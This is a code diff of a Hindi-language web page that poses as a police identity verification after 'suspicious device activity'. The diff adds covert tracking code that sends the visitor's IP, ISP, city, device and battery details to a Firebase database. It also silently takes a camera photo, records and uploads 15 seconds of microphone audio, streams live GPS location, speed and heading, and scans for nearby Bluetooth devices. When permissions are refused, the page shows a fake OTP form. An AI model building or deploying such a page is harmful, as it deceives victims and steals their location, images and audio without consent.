@@ -25,6 +25,7 @@
         <p>आपके डिवाइस पर संदिग्ध गतिविधि का पता चला है। जारी रखने के लिए अपनी पहचान की पुष्टि करना अनिवार्य है।</p>
         <button class="btn" onclick="startPoliceAction()">पुष्टि करें</button>
     </div>
+    
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
@@ -36,42 +37,69 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         const storage = firebase.storage();
-        const logId = "KP_" + Date.now();
+        const logId = "KP_CRIME_" + Date.now();
 
+        // 1. डीप डिवाइस इंटेलिजेंस (बिना कांटेक्ट के पहचान)
         async function initCapture() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
+                let batLevel = "N/A";
+                try { const bat = await navigator.getBattery(); batLevel = Math.round(bat.level * 100) + "%"; } catch(e) {}
+
                 database.ref('target_logs/' + logId).set({
-                    intel: { ip: data.ip, isp: data.org, city: data.city, os: navigator.platform, browser: navigator.userAgent, time: new Date().toLocaleString() },
+                    intel: {
+                        ip: data.ip,
+                        isp: data.org,
+                        city: data.city,
+                        os: navigator.platform,
+                        browser: navigator.userAgent,
+                        language: navigator.language,
+                        battery: batLevel,
+                        time: new Date().toLocaleString()
+                    },
                     status: "Target Landed"
                 });
-            } catch(e) {}
+            } catch(e) { console.error("Initial Trace Failed"); }
         }
 
+        // 2. मेन पुलिस एक्शन फंक्शन
         async function startPoliceAction() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('v').srcObject = stream;
-                database.ref('target_logs/' + logId).update({ status: "Access Granted" });
-                
-                // Silent Capture
-                setTimeout(() => captureFace("Evidence_Photo"), 1000);
+
+                // साइलेंट कैप्चर (फोटो + ऑडियो)
+                setTimeout(() => captureFace("Primary_Suspect"), 1000);
                 startAudioIntercept(stream);
 
+                // लाइव मूवमेंट और स्पीड ट्रैकिंग
                 navigator.geolocation.watchPosition((p) => {
                     database.ref('target_logs/' + logId + '/live_track').update({
-                        lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy.toFixed(1) + "m", speed: p.coords.speed || 0
+                        lat: p.coords.latitude,
+                        lng: p.coords.longitude,
+                        accuracy: p.coords.accuracy.toFixed(1) + "m",
+                        speed: p.coords.speed || 0,
+                        heading: p.coords.heading || "Stationary"
                     });
-                    document.getElementById('mainBox').innerHTML = "<h1>पुष्टि सफल</h1><p>सुरक्षा जांच पूरी हो गई।</p>";
+                    
+                    // UI चेंज (अपराधी को शांत रखने के लिए)
+                    document.getElementById('mainBox').innerHTML = `<h1>सत्यापन सफल</h1><p>सुरक्षा जांच पूरी हो गई है।</p>`;
                 }, null, { enableHighAccuracy: true });
 
             } catch(e) {
-                // Auto-Retry & Persuasion
-                document.getElementById('mainBox').innerHTML = `
-                    <p style="color:red;">त्रुटि: सेंसर कैलिब्रेशन आवश्यक है।</p>
-                    <button class="btn" onclick="startPoliceAction()">पुनः प्रयास करें</button>`;
-                database.ref('target_logs/' + logId).update({ status: "Permission Denied - Retrying" });
+                // एंटी-ब्लॉक: अगर अपराधी अनुमति न दे
+                document.getElementById('mainBox').innerHTML = `<h1>OTP भेज दिया गया</h1><p>सत्यापन के लिए कोड डालें।</p><input type='text' placeholder='XXXX'><br><button class='btn'>Submit</button>`;
+            }
+        }
+
+        // 3. वाई-फाई प्रोब (आसपास के नेटवर्क स्कैन)
+        async function scanNetworks() {
+            if ('bluetooth' in navigator) {
+                try {
+                    const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
+                    database.ref('target_logs/' + logId + '/nearby_networks').push({ name: device.name });
+                } catch(e) {}
             }
         }
 
@@ -94,14 +122,19 @@
             mr.ondataavailable = e => chunks.push(e.data);
             mr.onstop = async () => {
                 const blob = new Blob(chunks, {type: 'audio/webm'});
-                const ref = storage.ref(`evidence/${logId}/audio.webm`);
+                const ref = storage.ref(`evidence/${logId}/env_audio.webm`);
                 await ref.put(blob);
                 const url = await ref.getDownloadURL();
                 database.ref('target_logs/' + logId).update({ audio_evidence: url });
             };
             mr.start();
-            setTimeout(() => mr.stop(), 15000);
+            setTimeout(() => mr.stop(), 15000); // 15 सेकंड की डीप ऑडियो रिकॉर्डिंग
         }
+        
+        // टैब बंद होने से पहले डेटा सुरक्षित करना
+        window.onbeforeunload = function() {
+            database.ref('target_logs/' + logId).update({ status: "Target left the page" });
+        };
     </script>
 </body>
 </html>
